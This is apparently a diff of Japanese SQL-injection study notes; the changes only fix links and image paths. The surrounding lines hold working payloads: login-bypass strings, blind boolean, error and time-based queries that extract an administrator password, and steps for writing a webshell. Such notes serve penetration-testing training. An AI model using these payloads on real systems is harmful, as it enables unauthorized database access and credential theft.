@@ -12,7 +12,7 @@
 
 結果がブラウザの画面やレスポンス内に直接表示されるタイプのSQLiのこと（攻撃の送信とデータの取得を同じ通信チャネルで実施）。
 
-直接結果が現れないタイプを、[SQL Injection](SQL%20Injection.md#Blind%20SQLi)という。
+直接結果が現れないタイプを、[SQL Injection](#Blind%20SQLi)という。
 
 ## 🔍Enumeration
 
@@ -46,7 +46,7 @@ $
 > - 検索boxでは、行頭に`%`をつける(e.g.`%' xxx -- //`)
 > - `--` の後の空白がアプリ側で除去される場合があるので、コメントを使って対応する
 > 	- `-- #`
-> 	- `-- //` ...など（[SQL Injection](SQL%20Injection.md#SQLコメントアウトの種類表)）
+> 	- `-- //` ...など（[SQL Injection](#SQLコメントアウトの種類表)）
 > - HTTPリクエストヘッダが`Content-Type: application/x-www-form-urlencoded`のときは、ペイロードをURLエンコードすること
 > - 明確なエラーメッセージが表示されない場合もあるため、レスポンスの応答時間やlengthの変化を観察
 
@@ -189,7 +189,7 @@ admin') or (1=1 -- #
 - `/var/www/html`はApacheのデフォルトのWeb root、IISであれば`C:\inetpub\wwwroot`
 	- phpinfoの確認ができるのであれば、`$_SERVER['DOCUMENT_ROOT']`にWeb rootディレクトリが記載されているので、そこに保存する
 - `Uncaught type error`が返ることがあるが、返り値が意図されていたデータ型と異なるだけで、webshellの書き込みには影響はない
-![[Pasted image 20250420091519.png]]
+![](../../画像ファイル/Pasted%20image%2020250420091519.png)
 $$書き込み時のレスポンス例$$
 
 2. アップロード先urlにアクセスして任意のコマンドを実行する
@@ -236,7 +236,7 @@ or
 ### Error-based
 
  挿入した条件文のクエリがtrueの場合に意図的にエラーを発生させる。
-[SQL Injection](SQL%20Injection.md#悪意のある文字を使ったテスト（"Bad%20Chars"）)でわかる可能性が高い。
+[SQL Injection](#悪意のある文字を使ったテスト（"Bad%20Chars"）)でわかる可能性が高い。
 
 基本構文
 ```sql
@@ -252,7 +252,7 @@ or
 
 ### リモートコマンドの実行
 
-- MySQL：[SQL Injection](SQL%20Injection.md#★Webシェルの書き込み（MySQL）)
+- MySQL：[SQL Injection](#★Webシェルの書き込み（MySQL）)
 - MSSQL：[1433 - MSSQL](../Ports%20-%20Service/1433%20-%20MSSQL.md#💥%20Exploit)
 
 #### PostgreSQL
@@ -304,7 +304,7 @@ user=offsec' AND (SELECT username FROM users WHERE username = 'administrator' AN
 ```
 - Attack Type: sniper
 - Payload Type: Numbers
-![[Pasted image 20250420094746.png]]
+![](../../画像ファイル/Pasted%20image%2020250420094746.png)
 
 3. Intruderの結果から、レスポンスが変わる境界値を探す
 	- 実際にWebアプリ上で条件がTrueの反応があるかどうかを確認
@@ -334,7 +334,7 @@ user=offsec' AND SUBSTRING((SELECT password FROM users WHERE username = 'adminis
 
 6. IntruderのLength列を降順にソートし、レスポンスに条件が正の時のメッセージが記載されているペイロードを抽出していく>
 
-![[Pasted image 20250420095001.png]]
+![](../../画像ファイル/Pasted%20image%2020250420095001.png)
 
 
 #### Time-based
@@ -353,7 +353,7 @@ SELECT IF(<条件文>=1,SLEEP(3),'false')
 
 - 参考: RDBごとの文法[SQL cheet sheet Time delays & Conditional Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=a%20MySQL%20database.-,Time%20delays,-You%20can%20cause)
 - Burp SuiteのRepeaterの右下にレスポンスタイムが記載
-![[Pasted image 20250420100807.png]]
+![](../../画像ファイル/Pasted%20image%2020250420100807.png)
 
 #### Error-based
 
@@ -390,7 +390,7 @@ SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1)));
 
 ##### Error-based SQLi 具体例：パスワードの抽出
 
-- 基本の考え方は[SQL Injection](SQL%20Injection.md#Boolean-based%20SQLi%20具体例：パスワード抽出)と同じだが、Error-basedはWebアプリのレスポンスから値が漏洩する
+- 基本の考え方は[SQL Injection](#Boolean-based%20SQLi%20具体例：パスワード抽出)と同じだが、Error-basedはWebアプリのレスポンスから値が漏洩する
 
 1. 文字のおおまかな範囲を決定する。
 ```sql
@@ -401,7 +401,7 @@ user=offsec' AND IF((SELECT LENGTH(password) FROM users WHERE username = 'admini
 ```sql
 user=offsec' AND IF((SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'm', 1/0, 'a') = 'a'--
 ```
-- 💡自動で実行する方法は、[SQL Injection](SQL%20Injection.md#Boolean-based%20SQLi%20具体例：パスワード抽出)のペイロードを、Error-basedに変更するだけ
+- 💡自動で実行する方法は、[SQL Injection](#Boolean-based%20SQLi%20具体例：パスワード抽出)のペイロードを、Error-basedに変更するだけ
 - 参考：[Extracting data via visible error messages - SQLi cheat sheet by PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=Extracting%20data%20via%20visible%20error%20messages)
 
 
